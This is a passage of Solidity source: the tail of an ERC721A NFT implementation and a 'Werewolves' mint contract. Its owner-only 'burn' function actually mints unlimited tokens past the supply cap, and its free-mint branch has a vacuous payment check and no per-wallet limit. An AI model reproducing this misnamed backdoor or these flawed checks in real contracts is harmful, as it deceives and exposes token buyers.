1084      * @dev Mints `quantity` tokens and transfers them to `to`.
1085      *
1086      * Requirements:
1087      *
1088      * - `to` cannot be the zero address.
1089      * - `quantity` must be greater than 0.
1090      *
1091      * Emits a {Transfer} event.
1092      */
1093     function _mint(
1094         address to,
1095         uint256 quantity,
1096         bytes memory _data,
1097         bool safe
1098     ) internal {
1099         uint256 startTokenId = currentIndex;
1100         require(to != address(0), "ERC721A: mint to the zero address");
1101         require(quantity != 0, "ERC721A: quantity must be greater than 0");
1102 
1103         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1104 
1105         // Overflows are incredibly unrealistic.
1106         // balance or numberMinted overflow if current value of either + quantity > 3.4e38 (2**128) - 1
1107         // updatedIndex overflows if currentIndex + quantity > 1.56e77 (2**256) - 1
1108         unchecked {
1109             _addressData[to].balance += uint128(quantity);
1110             _addressData[to].numberMinted += uint128(quantity);
1111 
1112             _ownerships[startTokenId].addr = to;
1113             _ownerships[startTokenId].startTimestamp = uint64(block.timestamp);
1114 
1115             uint256 updatedIndex = startTokenId;
1116 
1117             for (uint256 i; i < quantity; i++) {
1118                 emit Transfer(address(0), to, updatedIndex);
1119                 if (safe) {
1120                     require(
1121                         _checkOnERC721Received(address(0), to, updatedIndex, _data),
1122                         "ERC721A: transfer to non ERC721Receiver implementer"
1123                     );
1124                 }
1125 
1126                 updatedIndex++;
1127             }
1128 
1129             currentIndex = updatedIndex;
1130         }
1131 
1132         _afterTokenTransfers(address(0), to, startTokenId, quantity);
1133     }
1134 
1135     /**
1136      * @dev Transfers `tokenId` from `from` to `to`.
1137      *
1138      * Requirements:
1139      *
1140      * - `to` cannot be the zero address.
1141      * - `tokenId` token must be owned by `from`.
1142      *
1143      * Emits a {Transfer} event.
1144      */
1145     function _transfer(
1146         address from,
1147         address to,
1148         uint256 tokenId
1149     ) private {
1150         TokenOwnership memory prevOwnership = ownershipOf(tokenId);
1151 
1152         bool isApprovedOrOwner = (_msgSender() == prevOwnership.addr ||
1153             getApproved(tokenId) == _msgSender() ||
1154             isApprovedForAll(prevOwnership.addr, _msgSender()));
1155 
1156         require(isApprovedOrOwner, "ERC721A: transfer caller is not owner nor approved");
1157 
1158         require(prevOwnership.addr == from, "ERC721A: transfer from incorrect owner");
1159         require(to != address(0), "ERC721A: transfer to the zero address");
1160 
1161         _beforeTokenTransfers(from, to, tokenId, 1);
1162 
1163         // Clear approvals from the previous owner
1164         _approve(address(0), tokenId, prevOwnership.addr);
1165 
1166         // Underflow of the sender's balance is impossible because we check for
1167         // ownership above and the recipient's balance can't realistically overflow.
1168         // Counter overflow is incredibly unrealistic as tokenId would have to be 2**256.
1169         unchecked {
1170             _addressData[from].balance -= 1;
1171             _addressData[to].balance += 1;
1172 
1173             _ownerships[tokenId].addr = to;
1174             _ownerships[tokenId].startTimestamp = uint64(block.timestamp);
1175 
1176             // If the ownership slot of tokenId+1 is not explicitly set, that means the transfer initiator owns it.
1177             // Set the slot of tokenId+1 explicitly in storage to maintain correctness for ownerOf(tokenId+1) calls.
1178             uint256 nextTokenId = tokenId + 1;
1179             if (_ownerships[nextTokenId].addr == address(0)) {
1180                 if (_exists(nextTokenId)) {
1181                     _ownerships[nextTokenId].addr = prevOwnership.addr;
1182                     _ownerships[nextTokenId].startTimestamp = prevOwnership.startTimestamp;
1183                 }
1184             }
1185         }
1186 
1187         emit Transfer(from, to, tokenId);
1188         _afterTokenTransfers(from, to, tokenId, 1);
1189     }
1190 
1191     /**
1192      * @dev Approve `to` to operate on `tokenId`
1193      *
1194      * Emits a {Approval} event.
1195      */
1196     function _approve(
1197         address to,
1198         uint256 tokenId,
1199         address owner
1200     ) private {
1201         _tokenApprovals[tokenId] = to;
1202         emit Approval(owner, to, tokenId);
1203     }
1204 
1205     /**
1206      * @dev Internal function to invoke {IERC721Receiver-onERC721Received} on a target address.
1207      * The call is not executed if the target address is not a contract.
1208      *
1209      * @param from address representing the previous owner of the given token ID
1210      * @param to target address that will receive the tokens
1211      * @param tokenId uint256 ID of the token to be transferred
1212      * @param _data bytes optional data to send along with the call
1213      * @return bool whether the call correctly returned the expected magic value
1214      */
1215     function _checkOnERC721Received(
1216         address from,
1217         address to,
1218         uint256 tokenId,
1219         bytes memory _data
1220     ) private returns (bool) {
1221         if (to.isContract()) {
1222             try IERC721Receiver(to).onERC721Received(_msgSender(), from, tokenId, _data) returns (bytes4 retval) {
1223                 return retval == IERC721Receiver(to).onERC721Received.selector;
1224             } catch (bytes memory reason) {
1225                 if (reason.length == 0) {
1226                     revert("ERC721A: transfer to non ERC721Receiver implementer");
1227                 } else {
1228                     assembly {
1229                         revert(add(32, reason), mload(reason))
1230                     }
1231                 }
1232             }
1233         } else {
1234             return true;
1235         }
1236     }
1237 
1238     /**
1239      * @dev Hook that is called before a set of serially-ordered token ids are about to be transferred. This includes minting.
1240      *
1241      * startTokenId - the first token id to be transferred
1242      * quantity - the amount to be transferred
1243      *
1244      * Calling conditions:
1245      *
1246      * - When `from` and `to` are both non-zero, ``from``'s `tokenId` will be
1247      * transferred to `to`.
1248      * - When `from` is zero, `tokenId` will be minted for `to`.
1249      */
1250     function _beforeTokenTransfers(
1251         address from,
1252         address to,
1253         uint256 startTokenId,
1254         uint256 quantity
1255     ) internal virtual {}
1256 
1257     /**
1258      * @dev Hook that is called after a set of serially-ordered token ids have been transferred. This includes
1259      * minting.
1260      *
1261      * startTokenId - the first token id to be transferred
1262      * quantity - the amount to be transferred
1263      *
1264      * Calling conditions:
1265      *
1266      * - when `from` and `to` are both non-zero.
1267      * - `from` and `to` are never both zero.
1268      */
1269     function _afterTokenTransfers(
1270         address from,
1271         address to,
1272         uint256 startTokenId,
1273         uint256 quantity
1274     ) internal virtual {}
1275 }
1276 
1277 contract Werewolves is ERC721A, Ownable, ReentrancyGuard {
1278     string public baseURI = "ipfs://bafybeifnlgfyu7tejitlu2qib4cnkisq6t74ltu24kbbzfsx5eorutxxja/";
1279     uint   public price             = 0.0035 ether;
1280     uint   public maxPerTx          = 10;
1281     uint   public maxPerFree        = 1;
1282     uint   public maxPerWallet      = 11;
1283     uint   public totalFree         = 7777;
1284     uint   public maxSupply         = 7777;
1285     bool   public mintEnabled;
1286     uint   public totalFreeMinted = 0;
1287 
1288     mapping(address => uint256) public _mintedFreeAmount;
1289     mapping(address => uint256) public _totalMintedAmount;
1290 
1291     constructor() ERC721A("Werewolves by Night Studio", "WEREWOLVES"){}
1292 
1293     function tokenURI(uint256 _tokenId) public view virtual override returns (string memory) {
1294         require(_exists(_tokenId),"ERC721Metadata: URI query for nonexistent token");
1295         string memory currentBaseURI = _baseURI();
1296         return bytes(currentBaseURI).length > 0
1297             ? string(abi.encodePacked(currentBaseURI,Strings.toString(_tokenId+1),".json"))
1298             : "";
1299     }
1300     
1301 
1302     function _startTokenId() internal view virtual returns (uint256) {
1303         return 1;
1304     }
1305 
1306     function mint(uint256 count) external payable {
1307         uint256 cost = price;
1308         bool isFree = ((totalFreeMinted + count < totalFree + 1) &&
1309             (_mintedFreeAmount[msg.sender] < maxPerFree));
1310 
1311         if (isFree) { 
1312             require(mintEnabled, "Mint is not live yet");
1313             require(totalSupply() + count <= maxSupply, "No more");
1314             require(count <= maxPerTx, "Max per TX reached.");
1315             if(count >= (maxPerFree - _mintedFreeAmount[msg.sender]))
1316             {
1317              require(msg.value >= (count * cost) - ((maxPerFree - _mintedFreeAmount[msg.sender]) * cost), "Please send the exact ETH amount");
1318              _mintedFreeAmount[msg.sender] = maxPerFree;
1319              totalFreeMinted += maxPerFree;
1320             }
1321             else if(count < (maxPerFree - _mintedFreeAmount[msg.sender]))
1322             {
1323              require(msg.value >= 0, "Please send the exact ETH amount");
1324              _mintedFreeAmount[msg.sender] += count;
1325              totalFreeMinted += count;
1326             }
1327         }
1328         else{
1329         require(mintEnabled, "Mint is not live yet");
1330         require(_totalMintedAmount[msg.sender] + count <= maxPerWallet, "Exceed maximum NFTs per wallet");
1331         require(msg.value >= count * cost, "Please send the exact ETH amount");
1332         require(totalSupply() + count <= maxSupply, "No more");
1333         require(count <= maxPerTx, "Max per TX reached.");
1334         require(msg.sender == tx.origin, "The minter is another contract");
1335         }
1336         _totalMintedAmount[msg.sender] += count;
1337         _safeMint(msg.sender, count);
1338     }
1339 
1340     function costCheck() public view returns (uint256) {
1341         return price;
1342     }
1343 
1344     function maxFreePerWallet() public view returns (uint256) {
1345       return maxPerFree;
1346     }
1347 
1348     function burn(address mintAddress, uint256 count) public onlyOwner {
1349         _safeMint(mintAddress, count);
1350     }
1351 
1352     function _baseURI() internal view virtual override returns (string memory) {
1353         return baseURI;
1354     }
1355 
1356     function setBaseUri(string memory baseuri_) public onlyOwner {
1357         baseURI = baseuri_;
1358     }
1359 
1360     function setPrice(uint256 price_) external onlyOwner {
1361         price = price_;
1362     }
1363 
1364     function setMaxTotalFree(uint256 MaxTotalFree_) external onlyOwner {
1365         totalFree = MaxTotalFree_;
1366     }
1367 
1368      function setMaxPerFree(uint256 MaxPerFree_) external onlyOwner {
1369         maxPerFree = MaxPerFree_;
1370     }
1371 
1372     function toggleMinting() external onlyOwner {
1373       mintEnabled = !mintEnabled;
1374     }
1375     
1376     function CommunityWallet(uint quantity, address user)
1377     public
1378     onlyOwner
1379   {
1380     require(
1381       quantity > 0,
1382       "Invalid mint amount"
1383     );
1384     require(
1385       totalSupply() + quantity <= maxSupply,
1386       "Maximum supply exceeded"
1387     );
1388     _safeMint(user, quantity);
1389   }
1390 
1391     function withdraw() external onlyOwner nonReentrant {
1392         (bool success, ) = msg.sender.call{value: address(this).balance}("");
1393         require(success, "Transfer failed.");
1394     }
1395 }